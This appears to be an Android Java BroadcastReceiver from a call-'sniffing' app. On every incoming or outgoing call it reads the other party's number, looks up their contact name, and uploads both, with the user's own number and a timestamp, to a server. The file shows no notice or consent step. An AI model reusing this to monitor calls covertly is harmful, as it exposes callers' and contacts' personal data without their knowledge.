package kr.ssm.sniffing.calling;

import kr.bunobuno.util.TimeRequest;
import kr.ewhapp.kjw.bunobuno.SingletonData;
import kr.ewhapp.kjw.bunobuno.network.NetworkModel;
import kr.ewhapp.kjw.bunobuno.network.NetworkRequest;
import kr.ewhapp.kjw.bunobuno.network.PostNetworkRequest;
import kr.ewhapp.kjw.bunobuno.network.PostNetworkRequest.OnPostMethodProcessListener;
import kr.ssm.sniffing.userinfo.UserData;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;

public class CallReceiver extends BroadcastReceiver {

	NetworkRequest request;
	TelephonyManager manager;

	Context context;
	String userNumber;
	String otherName;
	String otherNumber;

	String callerName;
	String callerNumber;
	String receiverNumber;
	String date;

	@Override
	public void onReceive(Context context, Intent intent) {

		this.context = context;
		String action = intent.getAction();
		Bundle bundle = intent.getExtras();
		String state = bundle.getString(TelephonyManager.EXTRA_STATE);
		otherNumber = bundle.getString(TelephonyManager.EXTRA_INCOMING_NUMBER);
		date = TimeRequest.getCurrentDate(System.currentTimeMillis());

		if (otherNumber != null) {
			if (action.equals("android.intent.action.PHONE_STATE")) {

				otherName = CallerInfo.getCallerName(context, otherNumber);

				if (state.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
					Log.d("ÀüÈ­ ²÷À½", "IDLE");
				} else if (state.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
					Log.i(otherNumber, otherName);
					sendToServer();
					return;
				}

			}
		}
		if (action.equals(Intent.ACTION_NEW_OUTGOING_CALL)) {
			otherNumber = bundle.getString(Intent.EXTRA_PHONE_NUMBER);
			otherName = CallerInfo.getCallerName(context, otherNumber);

			Log.e(otherNumber, otherName);

			sendToServer();
		}

	}

	private void sendToServer() {
		UserData data = new UserData();
		data.phoneNumber = SingletonData.getInstance().getUserData().phoneNumber;
		data.otherNumber = otherNumber;
		data.otherName = otherName;
		data.date = date;

		CallingNetworkRequest request = new CallingNetworkRequest(data);
		request.setOnPostMethodProcessListener(new OnPostMethodProcessListener<UserData>() {

			@Override
			public void onPostMethodProcessSuccess(PostNetworkRequest<UserData> request) {
				// TODO Auto-generated method stub

			}

			@Override
			public void onPostMethodProcessError() {
				// TODO Auto-generated method stub

			}
		});

		NetworkModel.getInstance().sendNetworkData(context, request);
	}

}